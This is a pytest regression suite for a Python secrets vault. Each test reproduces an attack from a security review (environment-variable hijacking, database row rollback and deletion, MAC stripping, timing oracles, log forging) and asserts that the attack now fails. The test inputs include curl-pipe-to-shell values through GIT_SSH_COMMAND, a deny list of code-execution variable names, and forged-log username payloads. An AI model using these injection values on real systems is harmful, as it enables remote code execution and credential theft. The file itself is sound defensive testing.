"""Regression tests for the 0.3.0 security review findings.

Each test reproduces the reported attack and asserts it now fails.
"""

import os
import sqlite3
import statistics
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import patch

import pytest
from cryptography.exceptions import InvalidTag

from sofiavault import KEY_SIZE, envload
from sofiavault.auth import (
    AuthStoreError,
    InvalidUsername,
    UserStore,
    _validated_costs,
    normalize_username,
)
from sofiavault.core import ARGON2_MEMORY_COST, ARGON2_TIME_COST
from sofiavault.envload import UnsafeVariableName, is_safe_name
from sofiavault.storage import get_schema_version
from sofiavault.vault import Vault, VaultCorrupted

PW = "regression-test-pw"


def _vault() -> tuple[Vault, Path]:
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    return Vault.create(path, PW), path


def _store() -> Path:
    return Path(tempfile.mkdtemp()) / "users.db"


# ── H1: unsafe environment variable names ────────────────────────────────────

DANGEROUS = ["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
             "PYTHONPATH", "PYTHONSTARTUP", "NODE_OPTIONS", "PERL5OPT",
             "RUBYOPT", "PATH", "IFS", "CLASSPATH", "GCONV_PATH",
             "SOFIAVAULT_KEY"]


@pytest.mark.parametrize("name", DANGEROUS)
def test_h1_dangerous_names_are_unsafe(name):
    assert is_safe_name(name) is False
    assert is_safe_name(name.lower()) is False


def test_h1_import_rejects_dangerous_names_before_storing():
    v, path = _vault()
    env_file = path.with_name("app.env")
    env_file.write_text(
        "DATABASE_URL=postgres://real\n"
        "BASH_ENV=/tmp/evil.sh\n"
        "LD_PRELOAD=/tmp/evil.so\n"
        "PATH=/tmp/evil/bin\n"
    )
    imported, _skipped, rejected = envload.import_env_file(v, env_file)

    assert imported == ["DATABASE_URL"]
    assert set(rejected) == {"BASH_ENV", "LD_PRELOAD", "PATH"}
    # never written to the vault at all
    assert [e.service for e in v.list_entries()] == ["env:database_url"]
    v.close()


def test_h1_load_refuses_unsafe_entry_already_in_vault():
    v, path = _vault()
    v.set("env:database_url", "postgres://real")
    v.set("env:ld_preload", "/tmp/evil.so")  # e.g. written by an older version

    env = {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env)
    assert env == {}  # nothing injected — all-or-nothing

    injected, _ = envload.load(vault=v, environ=env, allow_unsafe_names=True)
    assert "LD_PRELOAD" in injected  # explicit opt-in still possible
    v.close()


def test_h1_malformed_names_rejected():
    v, path = _vault()
    v.set("env:has space", "x")
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ={})
    v.close()


# ── H2: bootstrap credentials must not reach the child ───────────────────────

def test_h2_exec_strips_bootstrap_credentials():
    v, path = _vault()
    v.set("env:app_token", "scoped-secret")
    v.set("not-scoped-for-child", "WHOLE VAULT SECRET")

    seen = {}
    env_backup = dict(os.environ)
    os.environ["SOFIAVAULT_KEY"] = v.export_key()
    os.environ["SOFIAVAULT_PASSWORD"] = PW
    os.environ["SOFIAVAULT_KEY_FILE"] = "/tmp/whatever"
    try:
        def fake_execv(prog, argv):
            seen["key"] = os.environ.get("SOFIAVAULT_KEY")
            seen["password"] = os.environ.get("SOFIAVAULT_PASSWORD")
            seen["key_file"] = os.environ.get("SOFIAVAULT_KEY_FILE")
            seen["token"] = os.environ.get("APP_TOKEN")

        with patch("sofiavault.envload.os.execv", side_effect=fake_execv):
            envload.exec_with_env(v, ["env"])

        assert seen["token"] == "scoped-secret"   # child gets its secret
        assert seen["key"] is None                # ...but not the vault key
        assert seen["password"] is None
        assert seen["key_file"] is None
    finally:
        os.environ.clear()
        os.environ.update(env_backup)


# ── H3: entry blobs bound to row and vault ───────────────────────────────────

def test_h3_rollback_of_rotated_secret_is_rejected():
    v, path = _vault()
    v.set("prod-db", "old-secret")
    row = sqlite3.connect(str(path)).execute(
        "SELECT salt, nonce, blob FROM entries_v2").fetchone()
    v.set("prod-db", "rotated-secret")
    v.close()

    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE entries_v2 SET salt=?, nonce=?, blob=? WHERE id=1", row)
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    # The blob still decrypts in its own row, so per-entry auth can't see
    # this: the entry-set MAC is what catches the stale nonce.
    assert v2.tampered is True
    with pytest.raises(VaultCorrupted):       # fails closed, no stale secret
        v2.get("prod-db")
    v2.close()


def test_h3_duplicate_row_shadowing_is_rejected():
    v, path = _vault()
    v.set("api-key", "real-value")
    row = sqlite3.connect(str(path)).execute(
        "SELECT salt, nonce, blob FROM entries_v2").fetchone()
    v.close()

    conn = sqlite3.connect(str(path))
    # copy the authenticated blob into a lower rowid to shadow the real one
    conn.execute("INSERT INTO entries_v2 (id, salt, nonce, blob) VALUES (?,?,?,?)",
                 (0, row[0], row[1], row[2]))
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    assert v2.corrupt_count == 1   # the copy fails its row-bound AAD...
    assert v2.tampered is True     # ...and the extra row breaks the set MAC
    with pytest.raises(VaultCorrupted):
        v2.get("api-key")
    v2.close()


def test_h3_row_deletion_is_detected():
    v, path = _vault()
    v.set("keep", "a")
    v.set("delete-me", "b")
    v.close()

    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2 WHERE id=2")
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    assert v2.tampered is True     # silent removal of a secret is visible
    v2.close()


def test_h3_cross_vault_transplant_is_rejected():
    import base64

    va, patha = _vault()
    va.set("shared", "value-a")
    key_b64 = va.export_key()
    master = sqlite3.connect(str(patha)).execute(
        "SELECT salt, verify_hash FROM master WHERE id=1").fetchone()
    row = sqlite3.connect(str(patha)).execute(
        "SELECT salt, nonce, blob FROM entries_v2").fetchone()
    va.close()

    # Vault B genuinely shares vault A's master key (the export_key /
    # SOFIAVAULT_KEY provisioning flow across two machines).
    pathb = Path(tempfile.mkdtemp()) / "b.db"
    vb = Vault.create(pathb, "unrelated-pw")
    vb.set("filler", "x")
    vb.close()
    conn = sqlite3.connect(str(pathb))
    conn.execute("UPDATE master SET salt=?, verify_hash=? WHERE id=1", master)
    conn.execute("UPDATE entries_v2 SET salt=?, nonce=?, blob=? WHERE id=1", row)
    conn.commit()
    conn.close()

    vb2 = Vault.open(pathb, key=base64.b64decode(key_b64))
    # Same master key, but the blob is bound to vault A's id — it does not
    # decrypt here, and the swapped row also breaks B's entry-set MAC.
    assert vb2.corrupt_count == 1
    assert vb2.tampered is True
    vb2.close()


def test_h3_new_vaults_are_schema_v3():
    v, path = _vault()
    assert get_schema_version(v._conn) == 3
    v.close()


def test_h3_v2_vault_upgrades_transparently():
    """A 0.2.x/early-0.3.0 vault (constant AAD) still opens and reads."""
    import json
    import secrets as _s

    from sofiavault.core import ENTRY_CONTEXT, SALT_SIZE, derive_entry_key, encrypt

    v, path = _vault()
    key = v._key
    v.close()

    # Hand-write a v2-style row: constant AAD, and mark the file as v2
    payload = json.dumps({"service": "legacy", "username": "u", "url": "",
                          "password": "legacy-secret", "created_at": ""})
    salt = _s.token_bytes(SALT_SIZE)
    nonce, blob = encrypt(payload, derive_entry_key(key, salt), aad=ENTRY_CONTEXT)
    conn = sqlite3.connect(str(path))
    conn.execute("INSERT INTO entries_v2 (salt, nonce, blob) VALUES (?,?,?)",
                 (salt, nonce, blob))
    conn.execute("UPDATE vault_meta SET value='2' WHERE key='schema_version'")
    # A real 0.2.x vault has no entry-set MAC — it did not exist in that
    # version. Leaving one here would make the fixture a v3 vault with a
    # rolled-back schema_version, which is the Attack-4 tampering case and
    # must NOT be migrated (see test_h3_version_rollback_is_not_laundered).
    conn.execute("DELETE FROM vault_meta WHERE key='entries_mac'")
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    assert v2.corrupt_count == 0
    assert v2.get("legacy") == "legacy-secret"    # migrated, not lost
    assert get_schema_version(v2._conn) == 3
    v2.close()

    v3 = Vault.open(path, password=PW)            # and it stays readable
    assert v3.get("legacy") == "legacy-secret"
    v3.close()


# ── H4: fail closed on tampering ─────────────────────────────────────────────

def test_h4_tampered_entry_is_not_reported_as_missing():
    v, path = _vault()
    v.set("tls_verify", "true")
    v.set("other", "x")
    v.close()

    conn = sqlite3.connect(str(path))
    b = bytearray(conn.execute(
        "SELECT blob FROM entries_v2 WHERE id=1").fetchone()[0])
    b[0] ^= 0xFF
    conn.execute("UPDATE entries_v2 SET blob=? WHERE id=1", (bytes(b),))
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    with pytest.raises(VaultCorrupted) as exc:
        v2.get("tls_verify")
    # must NOT look like "never configured" to an `except KeyError` handler
    assert not isinstance(exc.value, KeyError)
    v2.close()


def test_h4_envload_refuses_partial_environment():
    v, path = _vault()
    v.set("env:tls_verify", "true")
    v.set("env:database_url", "postgres://real")
    v.close()

    conn = sqlite3.connect(str(path))
    b = bytearray(conn.execute(
        "SELECT blob FROM entries_v2 WHERE id=1").fetchone()[0])
    b[0] ^= 0xFF
    conn.execute("UPDATE entries_v2 SET blob=? WHERE id=1", (bytes(b),))
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)
    env = {}
    with pytest.raises(VaultCorrupted):
        envload.load(vault=v2, environ=env)
    assert env == {}      # no silent downgrade of the missing control
    v2.close()


# ── H5: anti-enumeration survives the cost-upgrade path ──────────────────────

def test_h5_dummy_hash_is_never_cheaper_than_a_real_row():
    """The decoy must not undercut any real row.

    Pricing it from the CHEAPEST stored row was backwards: an attacker
    probes a *specific* username, so the comparison is against that row's
    cost, not the store minimum. One legacy row then made every unknown
    user answer ~7x faster than a real one — a single-probe oracle.
    """
    path = _store()
    store = UserStore(path)
    store.add_user("alice", "alice-pw")
    store.add_user("bob", "bob-pw")
    # a row left behind by an older, cheaper version
    store._conn.execute(
        "UPDATE users SET time_cost=1, memory_cost=8192 WHERE username='alice'")
    store._conn.commit()

    dummy_t, dummy_m, _dummy_p = store._dummy_costs()
    for row in store._conn.execute("SELECT time_cost, memory_cost FROM users"):
        assert dummy_t * dummy_m >= row[0] * row[1], "decoy is cheaper than a real row"
    # ...and never weaker than what a fresh row would cost today
    assert dummy_t >= ARGON2_TIME_COST and dummy_m >= ARGON2_MEMORY_COST

    def timed(user):
        samples = []
        for _ in range(5):
            t0 = time.perf_counter()
            store.verify(user, "wrong-pw")   # wrong pw: never rehashes
            samples.append(time.perf_counter() - t0)
        return statistics.median(samples)

    unknown = timed("ghost")
    known = timed("alice")
    ratio = max(unknown, known) / max(min(unknown, known), 1e-9)
    assert ratio < 2.0, f"timing oracle: {unknown*1000:.1f}ms vs {known*1000:.1f}ms"
    store.close()


# ── M1: profile fields bound to their row; is_active integrity ───────────────

def test_m1_fields_cannot_be_transplanted_between_users():
    path = _store()
    fkey = os.urandom(KEY_SIZE)
    store = UserStore(path, fields_key=fkey)
    store.add_user("root", "root-pw", access_level=9, role="admin")
    store.add_user("mallory", "mallory-pw", access_level=1, role="junior")
    store.close()

    conn = sqlite3.connect(str(path))
    blob = conn.execute(
        "SELECT fields_enc FROM users WHERE username='root'").fetchone()[0]
    conn.execute("UPDATE users SET fields_enc=? WHERE username='mallory'", (blob,))
    conn.commit()
    conn.close()

    store2 = UserStore(path, fields_key=fkey)
    with pytest.raises(InvalidTag):   # privilege graft refused
        store2.verify("mallory", "mallory-pw")
    store2.close()


def test_m1_string_is_active_does_not_revive_account():
    path = _store()
    store = UserStore(path)
    store.add_user("bob", "bob-pw")
    store.deactivate("bob")
    store.close()

    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE users SET is_active='no' WHERE username='bob'")
    conn.commit()
    conn.close()

    store2 = UserStore(path)
    assert store2.verify("bob", "bob-pw") is None   # 'no' is not active
    store2.close()


# ── M3: threaded use ─────────────────────────────────────────────────────────

def test_m3_vault_usable_from_multiple_threads():
    v, path = _vault()
    v.set("shared", "value")
    errors = []
    results = []

    def worker():
        try:
            results.append(v.get("shared"))
        except Exception as exc:  # noqa: BLE001
            errors.append(repr(exc))

    threads = [threading.Thread(target=worker) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    assert results == ["value"] * 8
    v.close()


def test_m3_userstore_usable_from_multiple_threads():
    path = _store()
    store = UserStore(path)
    store.add_user("alice", "alice-pw")
    errors = []
    oks = []

    def worker():
        try:
            oks.append(store.verify("alice", "alice-pw") is not None)
        except Exception as exc:  # noqa: BLE001
            errors.append(repr(exc))

    threads = [threading.Thread(target=worker) for _ in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    assert all(oks)
    store.close()


# ── M5 / L9 / L11: username identity and input robustness ────────────────────

def test_m5_confusable_usernames_collapse_to_one_account():
    path = _store()
    store = UserStore(path)
    assert store.add_user("Admin", "pw-1") is True
    for variant in ("admin", "ADMIN", "  Admin  ", "ａdmin"):
        assert store.add_user(variant, "pw-2") is False   # same account
    assert store.list_users() == ["admin"]
    assert store.verify("ADMIN", "pw-1") is not None
    store.close()


@pytest.mark.parametrize("bad", [
    "admin\x00", "bob\nINFO login user=admin", "ad​min", "admin‮",
    "", "   ",
])
def test_m5_control_and_format_characters_rejected(bad):
    with pytest.raises(InvalidUsername):
        normalize_username(bad)


def test_m5_cyrillic_lookalike_stays_distinct():
    # NFKC does not fold Cyrillic to Latin, so these remain different
    # accounts — but neither can impersonate the other silently.
    assert normalize_username("аdmin") != normalize_username("admin")


@pytest.mark.parametrize("sep", [" ", " "])
def test_m5_unicode_line_separators_rejected(sep):
    # U+2028/U+2029 are category Zl/Zp, not Cc/Cf, so they slipped past the
    # control-character screen — yet str.splitlines() (and JS, and log
    # viewers) treat them as newlines, smuggling the same forged second log
    # record that rejecting '\n' is meant to prevent.
    payload = "alice" + sep + "auth.success user=admin"
    assert len(payload.splitlines()) == 2   # it really does break lines
    with pytest.raises(InvalidUsername):
        normalize_username(payload)


def test_l11_verify_never_raises_on_bad_input_types():
    path = _store()
    store = UserStore(path)
    store.add_user("alice", "alice-pw")
    assert store.verify(None, "x") is None
    assert store.verify("alice", 12345) is None
    assert store.verify("alice", None) is None
    assert store.verify(b"alice", "alice-pw") is None
    store.close()


def test_l9_import_json_reports_reasons_and_refuses_coercion():
    import json
    path = _store()
    src = path.with_name("legacy.json")
    src.write_text(json.dumps([
        {"name": "alice", "password": "pw-a"},
        {"name": "numeric", "password": 12345},
        {"name": "boolean", "password": True},
        {"name": "nopass"},
    ]))
    store = UserStore(path)
    created, skipped = store.import_json(src)
    assert created == ["alice"]
    assert any("numeric" in s and "non-string" in s for s in skipped)
    assert any("boolean" in s and "non-string" in s for s in skipped)
    assert any("nopass" in s and "missing password" in s for s in skipped)
    store.close()


# ── L1 / L7 / L12: hardening ─────────────────────────────────────────────────

def test_l1_files_never_world_readable_even_under_loose_umask():
    import stat
    old = os.umask(0o000)
    try:
        v, path = _vault()
        v.close()
        store_path = _store()
        UserStore(store_path).close()
    finally:
        os.umask(old)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert stat.S_IMODE(store_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(path.parent.stat().st_mode) & 0o077 == 0


def test_l7_destructive_helpers_not_in_public_api():
    import sofiavault
    assert "_shred_file" not in sofiavault.__all__
    assert "_load_entry_payload" not in sofiavault.__all__
    assert "Vault" in sofiavault.__all__
    assert "UserStore" in sofiavault.__all__


def test_l12_group_readable_key_file_refused():
    from sofiavault.vault import VaultLocked
    v, path = _vault()
    key_b64 = v.export_key()
    v.close()
    key_file = path.with_name("sv.key")
    key_file.write_text(key_b64)
    os.chmod(key_file, 0o644)
    with pytest.raises(VaultLocked, match="accessible to other users"):
        Vault.open_auto(path, environ={"SOFIAVAULT_KEY_FILE": str(key_file)})
    os.chmod(key_file, 0o600)
    Vault.open_auto(path, environ={"SOFIAVAULT_KEY_FILE": str(key_file)}).close()


def test_l3_malformed_master_record_raises_typed_error():
    v, path = _vault()
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE master SET salt=? WHERE id=1", (b"tiny",))
    conn.commit()
    conn.close()
    with pytest.raises(VaultCorrupted):     # not a raw argon2 HashingError
        Vault.open(path, password=PW)


def test_l5_load_is_atomic_on_invalid_name():
    v, path = _vault()
    v.set("env:aaa_first", "1")
    v.set("env:zzz_last", "2")
    v.set("env:bad=name", "3")
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=os.environ)
    assert "AAA_FIRST" not in os.environ    # nothing applied
    assert "ZZZ_LAST" not in os.environ
    v.close()


# ── H6: the entry-set MAC cannot be stripped or laundered ────────────────────
#
# The MAC lives in vault_meta, which is plain unauthenticated SQLite. Every
# rollback/deletion defence in H3 rests on it, so an attacker with DB write
# access must not be able to remove it or trick the code into re-signing.

def _rollback_fixture():
    """Vault where 'stripe-api' was rotated; returns (path, old_row)."""
    v, path = _vault()
    v.set("stripe-api", "sk_live_LEAKED_OLD")
    v.close()
    conn = sqlite3.connect(str(path))
    old = conn.execute("SELECT salt, nonce, blob FROM entries_v2 WHERE id=1").fetchone()
    conn.close()
    v = Vault.open(path, password=PW)
    v.set("stripe-api", "sk_live_ROTATED_NEW")
    v.close()
    return path, old


def test_h6_deleting_the_mac_row_does_not_erase_tamper_evidence():
    path, old = _rollback_fixture()
    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE entries_v2 SET salt=?, nonce=?, blob=? WHERE id=1", old)
    conn.execute("DELETE FROM vault_meta WHERE key='entries_mac'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    with pytest.raises(VaultCorrupted):
        v.get("stripe-api")          # must not hand back the leaked old key
    v.close()


def test_h6_blanking_the_mac_value_does_not_erase_tamper_evidence():
    v, path = _vault()
    v.set("stripe-api", "sk_live_X")
    v.set("db-pass", "hunter2")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2 WHERE id=1")
    conn.execute("UPDATE vault_meta SET value='' WHERE key='entries_mac'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    with pytest.raises(VaultCorrupted):
        v.get("stripe-api")
    v.close()


def test_h6_version_rollback_is_not_laundered_into_a_valid_mac():
    """schema_version is unauthenticated; rolling it to '2' re-enters
    migrate_v2_to_v3, which used to re-sign whatever the rows now held."""
    path, old = _rollback_fixture()
    conn = sqlite3.connect(str(path))
    before = conn.execute(
        "SELECT value FROM vault_meta WHERE key='entries_mac'").fetchone()[0]
    conn.execute("UPDATE entries_v2 SET salt=?, nonce=?, blob=? WHERE id=1", old)
    conn.execute("UPDATE vault_meta SET value='2' WHERE key='schema_version'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    with pytest.raises(VaultCorrupted):
        v.get("stripe-api")
    v.close()

    conn = sqlite3.connect(str(path))
    after = conn.execute(
        "SELECT value FROM vault_meta WHERE key='entries_mac'").fetchone()[0]
    conn.close()
    assert after == before, "migration re-signed a tampered entry set"


def test_h6_row_deletion_plus_version_rollback_is_detected():
    v, path = _vault()
    v.set("stripe-api", "sk_live_X")
    v.set("db-pass", "hunter2")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2 WHERE id=1")
    conn.execute("UPDATE vault_meta SET value='2' WHERE key='schema_version'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    v.close()


def test_h6_rollback_plus_mac_delete_plus_version_rollback_is_detected():
    """Removing BOTH unauthenticated signals at once.

    The schema-rollback defence only bails when a MAC row is present, and the
    'v3 implies a MAC' defence only fires while schema_version reads >= 3. An
    attacker who deletes the entries_mac row AND rolls schema_version to '2'
    defeats one guard with the other: migrate_v2_to_v3 re-entered with no MAC
    to compare against used to re-sign the tampered rows over a fresh MAC. The
    entry blobs themselves (still authenticated under the v3 AAD) are the
    witness the metadata is not.
    """
    path, old = _rollback_fixture()
    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE entries_v2 SET salt=?, nonce=?, blob=? WHERE id=1", old)
    conn.execute("DELETE FROM vault_meta WHERE key='entries_mac'")
    conn.execute("UPDATE vault_meta SET value='2' WHERE key='schema_version'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    with pytest.raises(VaultCorrupted):
        v.get("stripe-api")          # must not hand back the leaked old key
    v.close()

    # The real schema_version is restored and the tampered set is never
    # re-signed, so a second open reaches the same verdict.
    assert get_schema_version(Vault.open(path, password=PW)._conn) == 3
    v = Vault.open(path, password=PW)
    assert v.tampered
    v.close()


def test_h6_row_deletion_plus_mac_delete_plus_version_rollback_is_detected():
    v, path = _vault()
    v.set("stripe-api", "sk_live_X")
    v.set("db-pass", "hunter2")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2 WHERE id=1")
    conn.execute("DELETE FROM vault_meta WHERE key='entries_mac'")
    conn.execute("UPDATE vault_meta SET value='2' WHERE key='schema_version'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered, "a deleted row must not be laundered by stripping both signals"
    v.close()


def test_h6_new_vault_carries_a_mac_before_any_entry_is_written():
    """Without this, 'v3 implies a MAC exists' is false for empty vaults and
    an attacker could wipe every entry plus the MAC and look untampered."""
    v, path = _vault()
    v.close()
    conn = sqlite3.connect(str(path))
    row = conn.execute(
        "SELECT value FROM vault_meta WHERE key='entries_mac'").fetchone()
    conn.close()
    assert row is not None and row[0]


def test_h6_wiping_every_entry_and_the_mac_is_detected():
    v, path = _vault()
    v.set("stripe-api", "sk_live_X")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2")
    conn.execute("DELETE FROM vault_meta WHERE key='entries_mac'")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered, "a full wipe must not read as a legitimately empty vault"
    v.close()


def test_h6_delete_entry_refuses_to_run_without_the_key():
    """The keyless branch used to drop the MAC row outright — a one-liner
    for stripping tamper evidence through the library's own API."""
    from sofiavault.storage import delete_entry as _delete_entry
    v, path = _vault()
    v.set("stripe-api", "sk_live_X")
    entry_id = v.list_entries()[0].id
    with pytest.raises(ValueError):
        _delete_entry(v._conn, entry_id, None)
    v.close()


# ── H7: envload must refuse a tampered vault and poisoned values ─────────────

def test_h7_load_refuses_a_tampered_vault_even_with_nothing_to_decrypt():
    """Deleting an env:* row leaves every survivor decryptable, so
    corrupt_count stays 0 and no get() call is ever made to catch it."""
    v, path = _vault()
    v.set("env:require_tls", "1")
    v.set("env:api_key", "k")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered and v.corrupt_count == 0
    env = {}
    with pytest.raises(VaultCorrupted):
        envload.load(vault=v, environ=env)
    assert env == {}
    v.close()


def test_h7_load_refuses_tampered_vault_when_all_names_already_set():
    v, path = _vault()
    v.set("env:require_tls", "1")
    v.close()
    conn = sqlite3.connect(str(path))
    conn.execute("DELETE FROM entries_v2 WHERE id=1")
    conn.commit()
    conn.close()

    v = Vault.open(path, password=PW)
    assert v.tampered
    with pytest.raises(VaultCorrupted):
        envload.load(vault=v, environ={"REQUIRE_TLS": "0"})
    v.close()


def test_h7_nul_in_a_value_cannot_truncate_the_injection():
    """Entries inject in sorted order, so a poisoned value used to abort the
    mutation loop part-way and drop every name after it."""
    v, path = _vault()
    v.set("env:a_api_key", "real-key")
    v.set("env:b_poison", "x\x00y")
    v.set("env:c_require_tls", "1")
    v.close()

    v = Vault.open(path, password=PW)
    env = {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env)
    assert env == {}, "injection must stay all-or-nothing"
    v.close()


# ── H8: envload name gating and .env parsing ─────────────────────────────────
#
# The denylist covered only loaders and interpreters. An audit fed it 124
# known-dangerous names and 123 were accepted, giving a one-vault-write RCE
# via GIT_SSH_COMMAND and a TLS MITM via HTTPS_PROXY.

CODE_EXEC_NAMES = [
    "GIT_SSH_COMMAND", "GIT_EXTERNAL_DIFF", "GIT_PAGER", "GIT_ASKPASS",
    "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_GLOBAL",
    "GIT_PROXY_COMMAND", "HOME", "XDG_CONFIG_HOME", "ZDOTDIR", "TMPDIR",
    "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "NODE_EXTRA_CA_CERTS",
    "NODE_TLS_REJECT_UNAUTHORIZED", "GIT_SSL_NO_VERIFY", "OPENSSL_CONF",
    "HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY", "PIP_INDEX_URL",
    "NPM_CONFIG_REGISTRY", "GOFLAGS", "CARGO_HOME", "AWS_CONFIG_FILE",
    "AWS_CONTAINER_CREDENTIALS_FULL_URI", "KUBECONFIG", "DOCKER_HOST",
    "PGSERVICEFILE", "PGPASSFILE", "LESSOPEN", "MANPAGER", "BROWSER",
    "RSYNC_RSH", "CVS_RSH", "HGRCPATH", "SSH_ASKPASS", "SUDO_ASKPASS",
    "JAVA_OPTS", "JAVACMD", "MAVEN_OPTS", "DOTNET_STARTUP_HOOKS",
    "CORECLR_PROFILER_PATH", "R_PROFILE", "GTK_MODULES", "QT_PLUGIN_PATH",
    "GIO_MODULE_DIR", "MALLOC_CONF", "COMSPEC", "PATHEXT", "PSMODULEPATH",
    "GOOGLE_APPLICATION_CREDENTIALS", "TERMINFO", "GNUPGHOME",
]

#: Names people legitimately keep in a vault — over-blocking these pushes
#: users to allow_unsafe_names=True, which disables the whole gate.
LEGIT_SECRET_NAMES = [
    "DATABASE_URL", "API_KEY", "STRIPE_SECRET_KEY", "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY", "AWS_REGION", "PGPASSWORD", "PGUSER", "PGHOST",
    "REDIS_URL", "SENTRY_DSN", "JWT_SECRET", "GITHUB_TOKEN", "PORT",
]


@pytest.mark.parametrize("name", CODE_EXEC_NAMES)
def test_h8_code_exec_names_are_refused(name):
    assert is_safe_name(name) is False
    assert is_safe_name(name.lower()) is False


@pytest.mark.parametrize("name", LEGIT_SECRET_NAMES)
def test_h8_ordinary_secret_names_still_allowed(name):
    assert is_safe_name(name) is True


def test_h8_allowlist_injects_only_what_was_asked_for():
    v, path = _vault()
    v.set("env:database_url", "postgres://real")
    v.set("env:other_app_token", "not-mine")

    env = {}
    injected, _ = envload.load(vault=v, environ=env, allow=["DATABASE_URL"])
    assert injected == ["DATABASE_URL"]
    assert env == {"DATABASE_URL": "postgres://real"}
    v.close()


def test_h8_allowlist_still_raises_on_a_dangerous_entry():
    """A benign extra is ignored, but finding GIT_SSH_COMMAND in your own
    vault means you are being attacked — that must not be silent."""
    v, path = _vault()
    v.set("env:database_url", "postgres://real")
    v.set("env:git_ssh_command", "sh -c 'curl evil.sh|sh' #")

    env = {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env, allow=["DATABASE_URL"])
    assert env == {}
    v.close()


def test_h8_allowlist_overrides_allow_unsafe_names():
    v, path = _vault()
    v.set("env:database_url", "postgres://real")
    v.set("env:git_ssh_command", "sh -c 'curl evil.sh|sh' #")

    env = {}
    injected, _ = envload.load(vault=v, environ=env, allow=["DATABASE_URL"],
                               allow_unsafe_names=True)
    assert injected == ["DATABASE_URL"]
    assert "GIT_SSH_COMMAND" not in env
    v.close()


def test_h8_multiline_value_cannot_smuggle_a_variable():
    """The continuation lines of a pasted PEM block used to be parsed as
    fresh NAME=value pairs, so a reviewer reading key material would miss
    an injected GIT_SSH_COMMAND sitting inside it."""
    v, path = _vault()
    env_file = path.with_name("app.env")
    env_file.write_text(
        'JWT_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n'
        'GIT_SSH_COMMAND=curl evil.sh|sh\n'
        '-----END PRIVATE KEY-----"\n'
        'OK_VAR=fine\n'
    )
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)

    assert "GIT_SSH_COMMAND" not in imported
    assert sorted(imported) == ["JWT_PRIVATE_KEY", "OK_VAR"]
    assert "GIT_SSH_COMMAND" in v.get("env:jwt_private_key")   # it is value text
    assert "env:git_ssh_command" not in {e.service for e in v.list_entries()}
    v.close()


def test_h8_unterminated_quote_imports_nothing():
    v, path = _vault()
    env_file = path.with_name("bad.env")
    env_file.write_text('GOOD_ONE=a\nBROKEN="oops\nAFTER=b\n')

    with pytest.raises(envload.MalformedEnvFile):
        envload.import_env_file(v, env_file)
    assert [e.service for e in v.list_entries()] == []   # atomic
    v.close()


def test_h8_case_colliding_names_in_one_file_are_refused():
    """TOKEN and token collapse onto one service, so one silently wins."""
    v, path = _vault()
    env_file = path.with_name("dup.env")
    env_file.write_text("TOKEN=first\ntoken=second\n")
    imported, _skipped, rejected = envload.import_env_file(v, env_file)

    assert imported == ["TOKEN"]
    assert rejected == ["token"]
    v.close()


def test_h8_inline_comment_is_not_part_of_the_value():
    v, path = _vault()
    env_file = path.with_name("c.env")
    env_file.write_text("DEBUG=false # only locally\n")
    envload.import_env_file(v, env_file)
    assert v.get("env:debug") == "false"
    v.close()


def test_h8_exec_resolves_the_binary_before_injection():
    """execvp() searched the POST-injection PATH, so with an absent ambient
    PATH a vault entry could choose which binary ran."""
    import shutil

    v, path = _vault()
    v.set("env:app_token", "scoped")
    seen = {}

    def fake_execv(prog, argv):
        seen["prog"] = prog

    with patch("sofiavault.envload.os.execv", side_effect=fake_execv):
        envload.exec_with_env(v, ["env"])
    assert seen["prog"] == shutil.which("env")
    assert os.path.isabs(seen["prog"])
    os.environ.pop("APP_TOKEN", None)


def test_h8_trailing_newline_does_not_evade_the_denylist():
    """`$` also matches before a trailing newline, so "PATH\\n" passed
    VALID_NAME and then missed the UNSAFE_NAMES lookup."""
    assert is_safe_name("PATH\n") is False
